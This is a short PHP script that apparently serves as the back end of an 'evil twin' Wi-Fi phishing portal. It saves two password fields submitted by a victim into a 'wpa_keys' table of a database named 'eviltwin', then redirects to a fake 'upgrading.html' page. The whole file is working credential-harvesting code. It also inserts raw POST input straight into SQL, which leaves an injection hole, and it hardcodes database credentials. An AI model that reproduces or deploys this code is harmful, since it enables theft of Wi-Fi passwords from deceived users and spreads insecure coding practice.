<?php
session_start();
ob_start();

//Database Connection Setup!

$host="localhost";
$username="dodgers"; //root on windows
$pass="duck"; // "" on windows
$dbname="eviltwin";
$tbl_name="wpa_keys";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Post Request Coming from the user
//The front end will not let the user to enter different passwords
$password1=$_POST['password1'];
$password2=$_POST['password2'];


$sql = "INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')";
if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

mysqli_close($conn);

sleep(2);
header("location:upgrading.html");
ob_end_flush();
?>
